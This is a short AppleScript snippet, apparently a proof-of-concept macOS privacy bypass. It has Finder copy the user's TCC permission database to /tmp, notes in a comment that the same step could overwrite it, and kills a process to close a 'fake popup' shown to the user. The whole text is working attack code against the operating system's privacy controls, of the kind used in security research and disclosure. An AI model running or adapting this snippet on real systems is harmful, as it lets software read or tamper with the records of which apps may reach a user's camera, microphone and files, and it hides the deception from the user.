tell application "Finder"
	# copy the TCC database, this could also be used to overwrite it.
	set applicationSupportDirectory to POSIX path of (path to application support from user domain)
	set tccDirectory to applicationSupportDirectory & "com.apple.TCC/TCC.db"
	duplicate file (POSIX file tccDirectory as alias) to folder (POSIX file "/tmp/" as alias) with replacing
	# close our fake popup
	do shell script "/bin/bash -c 'pkill swift-frontend' &"
end tell